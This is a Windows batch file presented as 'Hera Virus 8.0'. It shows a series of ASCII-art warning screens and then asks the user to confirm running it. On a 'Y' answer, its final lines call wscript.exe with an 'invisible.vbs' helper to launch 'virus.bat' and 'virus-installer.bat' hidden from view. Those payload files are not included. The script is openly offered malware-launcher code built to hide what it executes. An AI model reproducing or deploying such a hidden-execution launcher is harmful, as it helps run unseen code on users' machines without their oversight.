@echo off
color F0
title Hera Virus 8.0
echo _____________________________________________________________________
echo Hera Virus 8.0
echo Created by a-blob
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@                  @
echo 			@  @     @@@@@@@@  @
echo 			@  @     @      @  @
echo 			@  @@@@@@@@@@@@@@  @
echo 			@  @     @@@       @
echo 			@  @     @  @@@    @
echo 			@  @     @     @@  @
echo 			@                  @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause

cls
echo _____________________________________________________________________
echo Are you sure you want to countinue?
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@      @@@@@@      @
echo 			@  @@@@    @@@@@   @
echo 			@         @@@@@@@  @
echo 			@         @@@@     @
echo 			@       @@@@       @
echo 			@       @@@@       @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause

cls
echo _____________________________________________________________________
echo This program will cause trouble on your computer!
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause

cls
echo _____________________________________________________________________
echo The creators of this program will not be responsible for any damage
echo caused by this program to your computer.
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause

cls
echo _____________________________________________________________________
echo It is not recommended to run this on your acutal computer.
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause


cls
echo _____________________________________________________________________
echo Oh, so you are still here, want to try it?
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@      @@@@@@      @
echo 			@  @@@@    @@@@@   @
echo 			@         @@@@@@@  @
echo 			@         @@@@     @
echo 			@       @@@@       @
echo 			@       @@@@       @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
pause

cls
color 47
echo _____________________________________________________________________
echo Alright then, press Y and Enter to continue.
echo If not, press N.
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________

:start
SET choice=
SET /p choice=Do you want to run the program? [N]: 
IF NOT '%choice%'=='' SET choice=%choice:~0,1%
IF '%choice%'=='Y' GOTO yes
IF '%choice%'=='y' GOTO yes
IF '%choice%'=='N' GOTO no
IF '%choice%'=='n' GOTO no
IF '%choice%'=='' GOTO no
ECHO "%choice%" is not valid
ECHO.
GOTO start

:no
cls
color F0
echo _____________________________________________________________________
echo Good choice.
echo _____________________________________________________________________
echo 			@@@@@@@@@@@@@@@@@@@@
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@        @@        @
echo 			@                  @
echo 			@        @@        @
echo 			@@@@@@@@@@@@@@@@@@@@
echo _____________________________________________________________________
PAUSE
EXIT

:yes
wscript.exe "invisible.vbs" "virus.bat"
wscript.exe "invisible.vbs" "virus-installer.bat"
